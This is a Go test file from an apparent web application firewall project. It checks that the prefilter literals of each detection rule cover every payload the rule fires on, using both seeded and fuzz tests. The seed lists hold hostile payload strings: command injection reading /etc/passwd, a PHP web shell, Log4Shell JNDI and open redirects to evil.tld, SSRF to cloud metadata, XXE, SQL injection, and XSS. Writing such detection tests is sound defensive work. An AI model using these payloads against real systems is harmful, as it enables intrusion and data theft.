// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package core

import (
	"strings"
	"testing"

	"github.com/gsoultan/gwaf/rules"
	"github.com/gsoultan/gwaf/types"
)

// The literals contract, checked over the rules rather than only the detectors.
//
// Seven of ten detectors carry a FuzzLiteralsAreExhaustive of their own. The
// rules did not, and the rules are where the contract was actually broken:
// offOriginOp declared "://" while its matcher accepted the protocol-relative
// "//host", so every scheme-omitted open redirect was undetectable in a
// shipping core rule. That took an afternoon of hand-probing to find, and this
// file finds that shape in seconds.
//
// # What the contract is
//
// A rule is evaluated only when the prefilter finds one of its operator's
// declared literals in the value. So if an operator can report on a value
// containing none of them, the automaton drops that value first and the rule is
// **silently dead** — it compiles, it lints, `gwaf explain` describes it, and it
// never fires. That failure is invisible from every direction except this one.
//
// The comparison is case-insensitive because the automaton folds ASCII.

// ruleOperators returns every core rule that declares literals, paired with the
// context its operator needs.
//
// Origins are supplied because the off-origin operators report nothing without
// them, and a rule that cannot fire cannot violate anything — testing it
// without origins would pass by vacuity.
func ruleOperators(t *testing.T) []rules.Rule {
	t.Helper()
	var out []rules.Rule
	for _, r := range Default() {
		if r.Op == nil {
			continue
		}
		if _, ok := r.Op.Literals(); !ok {
			continue
		}
		out = append(out, r)
	}
	if len(out) == 0 {
		t.Fatal("no core rule declares literals; the harness is measuring nothing")
	}
	return out
}

// evalContexts returns the contexts a value might arrive in, so a key-anchored
// operator is exercised rather than short-circuited.
func evalContexts(key string) []*rules.EvalContext {
	return []*rules.EvalContext{
		{Target: types.Target{Kind: types.TargetArgs}, Key: key,
			Origins: []string{"target.local"}},
		{Target: types.Target{Kind: types.TargetArgs}, Key: "q",
			Origins: []string{"target.local"}},
		{Target: types.Target{Kind: types.TargetRequestBody},
			Origins: []string{"target.local"}},
		{Target: types.Target{Kind: types.TargetFileNames}, Key: "f.filename",
			Origins: []string{"target.local"}},
	}
}

func coversLiteral(value string, lits []string) bool {
	lower := strings.ToLower(value)
	for _, l := range lits {
		if strings.Contains(lower, strings.ToLower(l)) {
			return true
		}
	}
	return false
}

// TestRuleLiteralsCoverKnownAttacks is the seeded half: every payload the
// corpus knows must be covered by the literals of whichever rule reports it.
func TestRuleLiteralsCoverKnownAttacks(t *testing.T) {
	seeds := []struct{ key, value string }{
		{"redirect_to", "//evil.tld/"},
		{"redirect_to", `/\evil.tld/`},
		{"next", "https://evil.tld/"},
		{"url", "file:///etc/"},
		{"path", "../../etc/passwd"},
		{"cmd", "; cat /etc/passwd"},
		{"q", "1' UNION SELECT pw--"},
		{"q", "<script>alert(1)</script>"},
		{"q", "{{7*7}}"},
		{"q", "${jndi:ldap://evil.tld/a}"},
		{"q", "<?php system($_GET[0]); ?>"},
		{"q", "require('child_process').execSync('id')"},
		{"q", "1;alert(document.domain)//"},
		{"f.filename", "a.php\x00.jpg"},
		{"q", "http://169.254.169.254/latest/meta-data/"},
		{"q", "gopher://10.0.0.5:6379/_SET%20x%20y"},
		{"q", `<!ENTITY x SYSTEM "file:///etc/passwd">`},
		{"q", `{"__proto__":{"isAdmin":true}}`},
	}

	for _, r := range ruleOperators(t) {
		lits, _ := r.Op.Literals()
		for _, s := range seeds {
			for _, ctx := range evalContexts(s.key) {
				if _, ok := r.Op.Eval(ctx, []byte(s.value)); !ok {
					continue
				}
				if !coversLiteral(s.value, lits) {
					t.Errorf("rule %d (%s) reported %q but declares no literal covering it;\n"+
						"  the prefilter drops this value, so the rule never runs",
						r.ID, r.Msg, s.value)
				}
			}
		}
	}
}

// FuzzRuleLiteralsAreExhaustive is the unseeded half.
//
// The seeded test above can only check payloads somebody thought of, which is
// the same limitation the evasion corpus has and the reason the off-origin bug
// survived: every attack anyone wrote by hand happened to carry a colon.
func FuzzRuleLiteralsAreExhaustive(f *testing.F) {
	for _, s := range []string{
		"//evil.tld/", `/\x`, "://", "; id", "1' OR '1'='1", "<script>",
		"${jndi:", "..", "file://", "alert(", "", "hello world", "0;A(/*",
		"a.php\x00.jpg", "select 1", "http://169.254.169.254/",
	} {
		f.Add("q", s)
	}
	f.Add("cmd", "id")
	f.Add("redirect_to", "//evil.tld")
	f.Add("f.filename", "x\x00y")

	// Built once: Default() compiles a ruleset per call and the fuzzer runs
	// millions of iterations.
	var set []rules.Rule
	for _, r := range Default() {
		if r.Op == nil {
			continue
		}
		if _, ok := r.Op.Literals(); ok {
			set = append(set, r)
		}
	}

	f.Fuzz(func(t *testing.T, key, value string) {
		if len(value) > 4096 || len(key) > 64 {
			t.Skip()
		}
		for _, r := range set {
			lits, _ := r.Op.Literals()
			for _, ctx := range evalContexts(key) {
				if _, ok := r.Op.Eval(ctx, []byte(value)); !ok {
					continue
				}
				if !coversLiteral(value, lits) {
					t.Fatalf("rule %d (%s) reported %q (key %q) but declares no literal "+
						"covering it: the prefilter would drop this value and the rule "+
						"would never run", r.ID, r.Msg, value, key)
				}
			}
		}
	})
}
